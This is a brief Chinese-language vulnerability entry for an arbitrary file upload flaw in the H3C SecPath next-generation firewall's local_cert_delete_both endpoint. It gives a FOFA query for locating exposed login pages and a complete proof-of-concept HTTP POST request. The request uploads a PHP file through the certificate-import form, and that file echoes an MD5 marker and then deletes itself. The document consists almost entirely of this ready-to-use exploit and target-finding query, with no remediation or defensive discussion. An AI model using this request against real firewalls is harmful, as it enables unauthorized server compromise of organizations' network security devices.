# H3C-SecPath下一代防火墙local_cert_delete_both存在任意文件上传漏洞

H3C SecPath 下一代防火墙 存在任意文件上传漏洞，攻击者通过漏洞获取服务器权限。

## fofa

```yaml
title="Web user login"
```

## poc

```yaml
POST /webui/?g=local_cert_delete_both HTTP/1.1
Host: xx.xx.xx.xx
Accept-Encoding: identity
Content-Length: 345
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Referer: http://www.baidu.com
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=ed63f728755e4a2f90d094ec09b0ed9a

--ed63f728755e4a2f90d094ec09b0ed9a
Content-Disposition: form-data; name="submit_post"

local_cert_import
--ed63f728755e4a2f90d094ec09b0ed9a
Content-Disposition: form-data; name="key_file_name"; filename="QyFlQF.php"
Content-Type: text/plain

<?php echo md5('OmwiBdiyupqeAlMJ');@unlink(__file__);?>
--ed63f728755e4a2f90d094ec09b0ed9a--
```

